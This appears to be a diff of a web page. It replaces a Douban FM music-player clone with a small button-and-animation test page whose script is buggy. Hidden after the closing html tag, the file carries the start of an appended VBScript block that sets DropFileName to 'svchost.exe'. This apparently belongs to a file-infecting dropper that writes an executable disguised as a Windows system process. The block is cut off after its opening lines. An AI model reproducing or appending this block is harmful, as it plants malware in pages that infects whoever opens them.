@@ -1,326 +1,49 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<meta charset="utf-8" />
-		<title>豆瓣FM</title>
-		<link rel="stylesheet" type="text/css" href="css/douban.css"/>
-		<link rel="stylesheet" type="text/css" href="css/doubanzuoce.css"/>
-		<script defer  src="js/douban.js" type="text/javascript" charset="utf-8"></script>
+		<meta charset="UTF-8">
+		<title></title>
 	</head>
+	<style type="text/css">
+		#big{
+			width: 200px;
+			height: 150px;
+			background-color: yellow;
+		}
+	</style>
 	<body>
-		<div id="dianjibeijing">
-			<button id="dianji">></button>
-		</div>
-		<div id="jiemianone">
-			<div id="all">
-			<!--顶部-->
-			<div>				
-				<div id="topone">
-					<div id="log">
-						<img src="img/log.jpg"/>
-					</div>
-					<nav>
-						<a href="">登录</a>				
-						<div id="xvxian"></div>
-						<a href="">马上注册</a>
-						<div id="xvxian2"></div>
-						<a href="">开启PRO</a>
-						<a href=""></a>
-					</nav>
+		<div id="big">
+			<div>test</div>
+			<span id="">
+				<div id="">
+					<button id="dianji">点击</button>
+					<button id="dianjiyi">点击1</button>
 				</div>
-			</div>
-			<!--顶部-->
-			<!--背景-->
-			<div id="firstone"></div>
-			<!--背景-->
-			<!--播放器-->
-			<div>
-				<div>				
-					<img id="xuezhiqian" src="img/xuezhiqian.jpg"/>
-				</div>
-				<div id="firsttwo">	
-					
-				</div>
-				<img src="img/03.jpg" id="paused"/>
-				<audio id="bgMusic">
+			</span>
+		</div>		
+	</body>
+	<audio id="bgMusic">
 					<source = src="薛之谦 - 演员.mp3" type="audio/mp3">
 					<source = src="薛之谦 - 演员.mp3" type="audio/ogg">
 				</audio>
-				<img src="img/04.jpg" id="imgxin"/>
-				<img src="img/05.jpg" id="imglaj"/>
-				<img src="img/06.jpg" id="imgnext"/>
-				<div id="firstthird">
-					<span id="jixv">继续收听 ></span>
-				</div>
-				
-			</div>
-			<!--播放器-->
-			<div id="fasong">
-				<img src="img/fs.jpg"/>
-				<a href="">
-					发送歌曲到手机
-				</a>
-			</div>
-			<div id="tingxiangsi">
-				<img src="img/2016-10-02_164357.jpg"/>
-				<a href="">听相似歌曲</a>
-			</div>
-			<div id="fenxiang">
-				<a href="">分享这首歌</a>
-			</div>
-			<div>
-				<button id="xiazai">
-					<img id="shouji" src="img/2016-10-02_172136.jpg"/>
-					<a href="">4.0 来啦！来下载吧</a>
-				</button>
-			</div>
-			<!--底部-->	
-			<div>
-				<span id="low1">© 2016 douban</span>
-				<a href="" id="low2">京ICP备11027288号</a>
-				<span id="low3"> 网络视听许可证0110418号 京公网安备110105012274</span>
-				<span id="low4">广告合作:</span>
-				<a href="" id="low5">adfm@douban.com</a>
-				<div id="low6">
-				<span>|</span>
-				<a href=""  color: #999999;>FM游乐场</a>
-				<span>|</span>
-				<a href="">FM用户手册</a>
-				<span>|</span>
-				</div>
-				<br />
-				<a href="" id="low7">豆瓣FM中心</a>			
-			</div>
-				<!--底部-->
-			<div>
-				<img src="img/01.jpg" id="low"/>
-			</div>			
-		</div>
-		</div>
-		<div id="secondbeijing">
-			<div id="second">
-				<div id="one">
-					<ul>
-						<li><button>我的私人兆赫</button></li>
-						<li><button>我的红心兆赫</button></li>
-						<li><button>豆瓣精选兆赫</button></li>
-					</ul>
-				</div>
-				<div id="two">
-					<ul>
-						<li>最近收听<hr id="xianone"></li>
-						<li>试试这些<hr id="xiantwo"></li>
-					</ul>
-				</div>
-				<div id="third">
-					<ul>
-						<li><button>布鲁斯 MHz</button></li>
-						<li><button>拉丁 MHz</button></li>
-						<li><button>民谣 MHz</button></li>
-						<li><button>摇滚 MHz</button></li>
-						<li><button>流行 MHz</button></li>
-					</ul>
-				</div>
-				<div id="four">
-					品牌兆赫<hr id="xianthird">
-				</div>
-				<div id="five">
-					<button>SK-II 最初的梦 MHz</button>
-				</div>				
-			</div>
-		</div>
-		<div id="zuocewai">
-			<!--左侧弹出-->		
-			<div id="zuocetanchu">
-				<!--第一部分-->
-				<div>
-					<div>
-						<p>全部兆赫</p>
-					<div id="inputsousuo">
-						<input type="text" placeholder="  搜索兆赫" style="width: 230px;height: 26px; border: 1px solid #E1E8E6;">
-					</div>
-					<div id="beijing"></div>
-					<div id="gundongimg">
-						<img src="img/31095.jpg"/>
-					</div>
-					<div id="yinyueleibie">
-						<nav>					
-							<span><a href="">摇滚</a> |</span>					
-							<span><a href="">古典</a> |</span>					
-							<span><a href="">爵士</a> |</span>					
-							<span><a href="">民谣/乡村</a> |</span>					
-							<span><a href="">流行</a> |</span>					
-							<span><a href="">电子</a> |</span>					
-							<span><a href="">原声配乐</a> |</span>					
-							<span><a href="">轻音乐</a> |</span>					
-							<span><a href="">说唱</a> |</span>					
-							<span><a href="">雷鬼</a> |</span>
-						</nav>
-						<br />
-						<nav>					
-							<span><a href="">拉丁</a> |</span>					
-							<span><a href="">世界音乐</a> |</span>					
-							<span><a href="">布鲁斯</a> |</span>					
-							<span><a href="">放克/灵歌/R&B</a> |</span>
-						</nav>
-					</div>
-					<div id="remenzhaohe">
-						<span>热门兆赫</span>
-					</div>
-					<div id="remenone">
-						<ul>
-							<li><a href=""><img src="img/1.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/3.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/5.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/7.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/9.jpg"/></a></li>					
-						</ul>
-					</div>
-					<div id="rementwo">
-						<ul>
-							<li><a href=""><img src="img/2.jpg"img/3.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/4.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/6.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/8.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/10.jpg"/></a></li>
-						</ul>
-					</div>
-					<div>
-						<div id="rone">
-							<pre><a href="">华语</a><a href="">MHz</a>                              <a href="">欧美MHz</a></pre>
-						</div>
-						<div id="rtwo">
-							<pre><a href="">八零MHz</a>                              <a href="">工作学习MHz</a></pre>
-						</div>
-						<div id="rthird">
-							<pre><a href="">粤语MHz</a>                              <a href="">轻音乐MHz</a></pre>
-						</div>
-						<div id="rfour">
-							<pre><a href="">咖啡MHz</a>                              <a href="">你的歌词我的故事MHz</a></pre>
-						</div>
-						<div id="rfive">
-							<pre><a href="">看书浇花晒太阳MHz</a>                    <a href="">爵士MHz</a></pre>
-						</div>
-					</div>
-					<div id="zhaohexiangqing">
-						<div id="rsix">
-							<pre>1189首歌曲 <a href="">兆赫详情 </a>                          3599首歌曲 <a href="">兆赫详情 </a></pre>
-						</div>
-						<div id="rseven">
-							<pre>883首歌曲 <a href="">兆赫详情 </a>                            <a href="">兆赫详情 </a></pre>
-						</div>
-						<div id="reight">
-							<pre>2704首歌曲 <a href="">兆赫详情 </a>                           2736首歌曲 <a href="">兆赫详情 </a></pre>
-						</div>
-						<div id="rnine">
-							<pre>1710首歌曲 <a href="">兆赫详情 </a>                           588首歌曲 <a href="">兆赫详情 </a></pre>
-						</div>
-						<div id="rten">
-							<pre>1228首歌曲 <a href="">兆赫详情 </a>                           4163首歌曲 <a href="">兆赫详情 </a></pre>
-						</div>
-					</div>
-				</div>
-				<!--第一部分-->
-				<div id="shangshengzuikuai">
-					上升最快
-				</div>
-				<!--第二部分-->
-				<div id="secondbufen">								
-					<div id="remenone">
-						<ul>
-							<li><a href=""><img src="img/11.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/13.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/15.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/17.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/19.jpg"/></a></li>					
-						</ul>
-					</div>
-					<div id="rementwo">
-						<ul>
-							<li><a href=""><img src="img/12.jpg"img/3.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/14.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/16.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/18.jpg"/></a></li>
-							<br />
-							<li><a href=""><img src="img/20.jpg"/></a></li>
-						</ul>
-					</div>
-					<div>
-						<div id="rone">
-							<pre><a href="">工作学习MHz</a>                          <a href="">小清新MHz</a></pre>
-						</div>
-						<div id="rtwo">
-							<pre><a href="">新歌MHz</a>                              <a href="">咖啡MHz</a></pre>
-						</div>
-						<div id="rthird">
-							<pre><a href="">古典MHz</a>                              <a href="">爵士MHz</a></pre>
-						</div>
-						<div id="rfour">
-							<pre><a href="">民谣MHz</a>                              <a href="">轻音乐MHz</a></pre>
-						</div>
-						<div id="rfive">
-							<pre><a href="">电影原声MHz</a>                          <a href="">九零MHz</a></pre>
-						</div>
-					</div>
-					<div id="zhaohexiangqing">
-						<div id="rsix">
-							<pre><a href="">兆赫详情 </a>                                     180首歌曲 <a href="">兆赫详情 </a></pre>
-						</div>
-						<div id="rseven">
-							<pre>10000+首歌曲 <a href="">兆赫详情 </a>                        1710首歌曲 <a href="">兆赫详情 </a></pre>
-						</div>
-						<div id="reight">
-							<pre>2646首歌曲 <a href="">兆赫详情 </a>                          4163首歌曲 <a href="">兆赫详情 </a></pre>
-						</div>
-						<div id="rnine">
-							<pre>3781首歌曲 <a href="">兆赫详情 </a>                          2736首歌曲 <a href="">兆赫详情 </a></pre>
-						</div>
-						<div id="rten">
-							<pre>4377首歌曲 <a href="">兆赫详情 </a>                          874首歌曲 <a href="">兆赫详情 </a></pre>
-						</div>
-					</div>
-				</div>
-				<!--第二部分-->
-				<div id="pinpaizhaohe">
-					品牌兆赫
-				</div>
-				<div id="disanbufen">				
-					<div id="remenone">
-						<ul>
-							<li><a href=""><img src="img/11.jpg"/></a></li>											
-						</ul>
-					</div>
-					<div>
-						<div id="rone">
-							<pre><a href="">SK-II 最初的梦MHz</a></pre>
-						</div>
-					</div>
-					<div id="zhaohexiangqing">
-						<div id="rsix">
-							<pre>50首歌曲<a href="">兆赫详情 </a></pre>
-						</div>
-					</div>
-				</div>
-				<button id="dianjituihui"><</button>
-			</div>
-			<!--左侧弹出-->
-		</div>
-	</body>
+	<script type="text/javascript">
+		var pee = -200  
+	    var drec = 40;  
+	    var speed = 20;  
+	    var l = pee;
+		var dianji = document.getElementById("dianji");
+		var dianjiyi = document.getElementById("dianjiyi");
+		var big = document.getElementById("big");
+		dianji.onclick = function  dianji(){
+			l += drec;
+			big.style.left = 1 + 'px';
+			if (l<0) {
+				setTimeout('dianji()',speed)
+			} else{
+				dianjiyi.onclick = moveOut;
+			}
+		}	
+	</script>
 </html>
 <SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
